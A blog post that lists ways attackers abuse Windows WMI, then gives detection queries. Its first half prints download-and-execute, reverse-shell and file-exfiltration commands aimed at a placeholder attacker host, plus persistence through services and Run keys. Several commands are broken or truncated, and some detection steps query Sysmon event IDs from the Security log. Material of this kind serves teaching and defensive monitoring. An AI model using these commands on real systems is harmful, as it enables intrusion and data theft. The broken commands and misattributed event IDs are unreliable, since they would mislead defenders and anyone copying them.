---
layout: post
  title: How the attacker abuses WMI
tags: WMI
math: False
date: 2025-05-02 15:32 +0800
---
WMI Event Subscription (Persistence)
What it is: Attackers create WMI event subscriptions to execute malicious actions based on system events, like startup or user logon, ensuring persistence.

How it works:

Attackers create __EventFilter and __EventConsumer to trigger actions when system events occur.
Example:

An attacker can create an event filter using WMI to execute a PowerShell script upon system startup, maintaining persistence even after reboots.
Command:
$filter = [wmiclass]"\\localhost\root\cimv2:__EventFilter" $consumer = [wmiclass]"\\localhost\root\cimv2:__EventConsumer" $action = "powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-url.com/payload.ps1')"
WMI Remote Execution (Lateral Movement)
What it is: Attackers use WMI to execute commands remotely on other systems, facilitating lateral movement across the network without needing traditional remote access protocols.

How it works:

Tools like wmic or PowerShell’s Invoke-WmiMethod execute commands remotely on other systems within the network.
Example:

An attacker uses wmic to execute a command on a remote system that downloads and executes a malicious payload.
Command:
wmic /node:TargetSystem process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest 'http://malicious-url.com/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'; Start-Process 'C:\Windows\Temp\payload.exe'

WMI as a Backdoor (Persistence)
What it is: Attackers install a backdoor via WMI to maintain control over the compromised system even after reboots.

How it works:

WMI is used to execute commands remotely, typically opening a reverse shell or enabling further exploitation.
Example:

An attacker uses WMI to execute a PowerShell script that opens a reverse shell back to the attacker’s server.
Command:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -Command Invoke-WebRequest 'http://malicious-url.com/reverse-shell.ps1' -OutFile 'C:\Windows\Temp\reverse-shell.ps1'; C:\Windows\Temp\reverse-shell.ps1"
WMI for Pivoting (Lateral Movement)
What it is: After compromising one system, attackers use WMI to move laterally to other systems, expanding the attack footprint across the network.

How it works:

Attackers leverage WMI to execute commands on additional systems, further escalating privileges and spreading across the network.
Example:

An attacker uses WMI to run commands on a target machine to download and execute malware from a remote server.
Command:
wmic /node:TargetSystem process call create "powershell.exe -Command Invoke-WebRequest 'http://malicious-url.com/malware.exe' -OutFile 'C:\Windows\Temp\malware.exe'; Start-Process 'C:\Windows\Temp\malware.exe'"

WMI Scheduled Task Creation (Persistence)
What it is: Attackers use WMI to create scheduled tasks that ensure malicious payloads are executed at specific times or events, such as system reboot or user logon.

How it works:

WMI schedules tasks that trigger malicious scripts or binaries at system startup or user logon.
Example:

An attacker creates a scheduled task using WMI that runs a malicious PowerShell script every time a user logs on to the system.
Command:
$task = [wmiclass]"\\localhost\root\cimv2:Win32_ScheduledJob" $task.Create("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest 'http://malicious-url.com/payload.ps1' -OutFile 'C:\Windows\Temp\payload.ps1'; Start-Process 'C:\Windows\Temp\payload.ps1'")
WMI for Remote Code Execution (RCE)
What it is: Attackers use WMI to remotely execute arbitrary code on another system without requiring traditional administrative access.

How it works:

WMI allows attackers to trigger remote execution of code, bypassing traditional defenses like firewalls and remote access tools.
Example:

An attacker remotely runs a malicious executable or PowerShell script using WMI.
Command:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c http://malicious-url.com/malware.exe
WMI Event Filters for Data Exfiltration
What it is: Attackers use WMI event filters to capture system or user data and send it to an external server for exfiltration.

How it works:

WMI event subscriptions are set up to monitor system events (e.g., file creation) and send sensitive data to an attacker-controlled server.
Example:

An attacker sets up a WMI event subscription to trigger on file creation and then sends a copy of sensitive files to an external server.
Command:
$eventFilter = [wmiclass]"\\localhost\root\cimv2:__EventFilter" $eventConsumer = [wmiclass]"\\localhost\root\cimv2:__EventConsumer" $action = "powershell.exe -Command Invoke-WebRequest -Uri 'http://malicious-url.com/upload' -Method POST -Body (Get-Content 'C:\Users\victim\Documents\important.txt')"

WMI for Manipulating Services (Persistence)
What it is: Attackers use WMI to create or manipulate services that ensure persistence or further exploitation on the compromised system.

How it works:

WMI can be used to create new services or manipulate existing ones, allowing attackers to execute malicious code on system startup or other specified conditions.
Example:

An attacker uses WMI to create a new service that runs a malicious payload each time the system starts.
Command:
$service = Get-WmiObject -Class Win32_Service -Filter "Name='MyMaliciousService'" $service.Create("C:\Windows\Temp\payload.exe", "MaliciousService", "auto", "localSystem", "C:\Windows\Temp\payload.exe")
WMI for Creating Backdoor Network Connections
What it is: Attackers use WMI to create network connections that serve as backdoors for remote access.

How it works:

WMI can be used to initiate network connections, allowing attackers to maintain control of the compromised system or exfiltrate data.
Example:

An attacker uses WMI to invoke commands that create network connections to attacker-controlled servers.
Command:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c start http://attacker-controlled-url.com/reverse-shell.exe
WMI for Credential Dumping (Lateral Movement)
What it is: Attackers use WMI to gather and exfiltrate credentials or password hashes from compromised systems to facilitate lateral movement.

How it works:

WMI scripts are used to extract credentials, password hashes, or other sensitive data from systems.
Example:

An attacker uses WMI to dump credentials from the Windows SAM or LSASS memory.
Command:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -Command Invoke-WebRequest 'http://malicious-url.com/exfiltrate-credentials.ps1' -OutFile 'C:\Windows\Temp\credentials.ps1'"
WMI to Modify Registry Keys (Persistence)
What it is: Attackers use WMI to modify registry keys to execute malicious payloads on system startup.

How it works:

WMI can be used to modify the Windows registry, ensuring malicious programs are run when the system boots up.
Example:

An attacker modifies a registry key via WMI to run a malicious application on system startup.
Commannd:
Invoke-WmiMethod -Class Win32_Registry -Name Create -ArgumentList "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "MyMaliciousApp", "C:\Windows\Temp\payload.exe"
WMI for Triggering Malicious PowerShell Scripts
What it is: Attackers use WMI to remotely execute malicious PowerShell scripts, which are often used to download additional tools or payloads.

How it works:

PowerShell scripts can be invoked via WMI as part of the attack chain to download and execute malicious code.
Example:

An attacker uses WMI to invoke a PowerShell script that downloads additional tools from an external server.
Command:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -ExecutionPolicy Bypass
WMI for Rootkit Installation (Persistence)
Explanation: Attackers leverage WMI to install rootkits or alter system components to maintain control and avoid detection, often evading traditional security tools.

Detection:

Event ID 4688: Monitors process creation, including those associated with malicious rootkits.
Event ID 7045: Tracks service installations, which could include services related to rootkits.
Example Detection:

Watch for process creation and service installation events related to rootkit files.
Get-WinEvent -LogName "System" | Where-Object { $_.Id -eq 7045 -and $_.Message -like "*rootkit*" }

Rationale: Rootkits installed via WMI are stealthy. Monitoring for new processes and services associated with rootkit behavior can help identify this persistence technique.

Lets Move TO The Detection Part
WMI for Modifying Event Logs (Evading Detection)
Explanation: Attackers use WMI to modify, delete, or suppress event logs to cover up their actions, making it harder to trace their activities.

Detection:

Event ID 19: Tracks the modification of WMI event subscriptions, which might be used to hide log alterations.
Event ID 10: Monitors WMI command execution, including potential log modification actions.
Example Detection:

Correlate WMI execution events with any suspicious log deletions or modifications.
Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 19 }

Rationale: Modifying event logs through WMI can be a strong indication of an attacker trying to cover their tracks. Monitoring for WMI-related modifications helps detect this technique.

WMI Event Subscription (Persistence)
Explanation: WMI event subscriptions are used by attackers to establish a backdoor on a system. These subscriptions can trigger malicious actions when certain system events occur.

Detection:

Event ID 19: Indicates the creation or modification of WMI event subscriptions.
Event ID 10: Logs WMI executions, often linked to scripts or processes that are triggered by event subscriptions.
Example Detection:

Monitor for event subscription creation and WMI execution, especially when tied to system events.
Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 19 }

Rationale: Persistent backdoors created via WMI event subscriptions can survive reboots. Tracking these events helps detect unauthorized persistence mechanisms.

WMI Remote Execution (Lateral Movement)
Explanation: WMI is often used for remote command execution across the network, allowing attackers to move laterally without triggering traditional remote administration tools.

Detection:

Event ID 4688: Monitors process creation, which includes remote executions via WMI.
Event ID 4648: Detects logon attempts that use explicit credentials, signaling potential lateral movement.
Example Detection:

Watch for the execution of wmic or PowerShell, which can indicate WMI-based lateral movement.
Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4688 -and $_.Message -like "*wmic*" }

Rationale: Remote execution and lateral movement using WMI can bypass traditional security defenses. Monitoring for these events can reveal suspicious lateral activity across the network.

WMI as a Backdoor (Persistence)
Explanation: WMI can be used to establish a persistent backdoor, which can survive system reboots. Attackers might install malicious scripts or binaries that are triggered by certain system events.

Detection:

Event ID 4688: Tracks process creation, which may reveal WMI-based backdoor executables.
Event ID 7045: Monitors service installations, which may include malicious services created through WMI for persistence.
Example Detection:

Investigate new processes or services that might indicate a backdoor established via WMI.
Get-WinEvent -LogName "System" | Where-Object { $_.Id -eq 7045 -and $_.Message -like "*maliciousservice*" }

Rationale: Backdoors set up using WMI can persist even after a reboot. Service creation and process execution tied to WMI commands help detect backdoor persistence.

WMI for Pivoting (Lateral Movement)
Explanation: WMI is a useful tool for pivoting across the network, allowing attackers to move between systems without relying on traditional remote administration tools like RDP.

Detection:

Event ID 4688: Detects suspicious process execution, especially when WMI-related commands like wmic are invoked remotely.
Event ID 4648: Monitors logon events, particularly those indicating credential use for lateral movement.
Example Detection:

Correlate remote execution events with unusual logon attempts or suspicious processes.
Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4688 -and $_.Message -like "*wmic*" }

Rationale: Pivoting via WMI can be harder to detect than using traditional tools. Monitoring for WMI executions across the network and correlating logon events is essential for identifying lateral movement.

WMI Scheduled Task Creation (Persistence)
Explanation: WMI can create or modify scheduled tasks that persist even through system reboots, allowing attackers to execute malicious scripts or binaries on a regular basis.

Detection:

Event ID 4697: Logs the installation of services that could be associated with scheduled task creation.
Event ID 10: Tracks WMI executions that might relate to scheduled task creation or manipulation.
Example Detection:

Watch for task creation events and any associated WMI-based execution that may signal scheduled tasks for persistence.
Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4697 }

Rationale: Scheduled tasks created via WMI allow attackers to run scripts persistently. Monitoring these events can reveal persistence mechanisms set by attackers.

WMI for Remote Code Execution (RCE)
Explanation: WMI can be leveraged to execute arbitrary code remotely, enabling attackers to bypass security controls and run commands without needing direct access to the system.

Detection:

Event ID 4688: Monitors process creation for remote code execution via WMI (e.g., PowerShell, wmic).
Event ID 10: Tracks WMI command executions that could indicate remote code execution.
Example Detection:

Correlate suspicious remote code execution events through WMI with unusual network activity or file modifications.
Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4688 -and $_.Message -like "*powershell.exe*" }

Rationale: Remote code execution via WMI bypasses traditional defenses. Monitoring for this kind of activity can help detect malicious use of WMI for arbitrary code execution.

WMI Event Filters for Data Exfiltration
Explanation: Event filters can be used by attackers to monitor system activity and exfiltrate data, such as sending logs or files to an external server.

Detection:

Event ID 10: Logs WMI execution, which might indicate data exfiltration-related actions.
Event ID 19: Detects the creation of WMI event filters, which could be set up to capture and send system data.
Example Detection:

Investigate WMI event filters and correlate them with network traffic indicating potential data exfiltration.
Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 10 }

Rationale: Data exfiltration via WMI event filters can be stealthy. Monitoring these events alongside network traffic can help detect such attacks.

WMI for Manipulating Services (Persistence)
Explanation: Attackers may use WMI to manipulate or install services that provide persistence on a system or escalate privileges.

Detection:

Event ID 7045: Service creation or modification, potentially related to malicious services installed via WMI.
Event ID 4688: Tracks the execution of commands related to service manipulation through WMI.
Example Detection:

Monitor for the creation or modification of services and correlating WMI command executions.
Get-WinEvent -LogName "System" | Where-Object { $_.Id -eq 7045 -and $_.Message -like "*maliciousservice*" }

Rationale: WMI is a versatile tool for manipulating services. Monitoring for service installations and WMI execution can help detect attackers establishing persistence via services.

WMI for Triggering Malicious PowerShell Scripts
Explanation: Attackers often use WMI to trigger malicious PowerShell scripts that can perform actions like downloading malware or exfiltrating data.

Detection:

Event ID 4688: Tracks the creation of processes, particularly PowerShell or suspicious scripts triggered via WMI.
Event ID 4104: PowerShell script block logging, which can reveal the contents of malicious scripts.
Example Detection:

Correlate PowerShell execution events with suspicious network activity or file modifications to detect malicious scripts triggered by WMI.
Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4688 -and $_.Message -like "*powershell.exe*" }

Rationale: PowerShell is commonly used for malicious purposes in WMI-based attacks. Monitoring PowerShell executions and script block logging can help detect such malicious activities.
